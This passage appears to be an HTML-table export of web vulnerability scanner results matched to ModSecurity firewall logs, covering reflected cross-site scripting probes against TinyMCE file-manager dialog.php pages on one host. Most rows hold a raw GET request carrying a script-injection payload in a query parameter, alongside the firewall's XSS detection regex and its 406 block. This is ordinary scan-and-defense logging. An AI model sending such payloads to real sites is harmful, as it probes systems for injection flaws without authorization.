</td><td class=xl24 width=64 >2015-04-01 09:27:52</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:50 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(610199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsvqwQAW0AABvT@GwAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsvqwQAW0AABvT@GwAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366824</td><td class=xl24 width=64 >2015-03-31 20:21:03</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551ac1cc89409</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=&quot;&gt;&lt;script&gt;alert(882399)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=6kcqcqsrlrff8614glr5tsibt6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:53</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:52 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551ac1cc89409. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(882399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtswKwQAW0AAHhB77QAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtswKwQAW0AAHhB77QAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366841</td><td class=xl24 width=64 >2015-03-31 20:29:40</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager_plugin/filemanager/dialog.php?demo=dswa</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >demo</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager_plugin/filemanager/dialog.php?demo='&gt;&lt;script&gt;alert(140399)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: PHPSESSID=gq2g8nas6a025ku7p06llms4h0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:54</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:53 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:demo. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(140399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager_plugin/filemanager/dialog.php&quot;] [unique_id &quot;VRtswawQAW0AABt@bVsAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtswawQAW0AABt@bVsAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366842</td><td class=xl24 width=64 >2015-03-31 20:31:54</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(985799)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=h1pfr5tigntiku1lc550mi18o4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:55</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:54 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(985799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRtswqwQAW0AAHchlVMAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtswqwQAW0AAHchlVMAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366843</td><td class=xl24 width=64 >2015-03-31 20:33:38</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(872099)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=uopmelt8dnfva6p8n9npr23tm2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:57</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:55 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(872099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRtsw6wQAW0AAHgzv0UAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsw6wQAW0AAHgzv0UAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366844</td><td class=xl24 width=64 >2015-03-31 20:33:57</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(271899)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=ntpat97tdr70c01ttaaihtnea7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:58</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:57 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(271899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRtsxawQAW0AAB7zKNIAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsxawQAW0AAB7zKNIAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366845</td><td class=xl24 width=64 >2015-03-31 20:35:21</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(596899)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=b5olig2a6i9j2kf46bdopuecq2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:59</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:58 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(596899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRtsxqwQAW0AAHhGMtsAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsxqwQAW0AAHhGMtsAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366846</td><td class=xl24 width=64 >2015-03-31 20:37:05</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(788599)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=s6o7rr1tm69e80h05oq8clq1t5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:01</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:59 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(788599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRtsx6wQAW0AAHzDqsEAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsx6wQAW0AAHzDqsEAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366847</td><td class=xl24 width=64 >2015-03-31 20:38:36</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
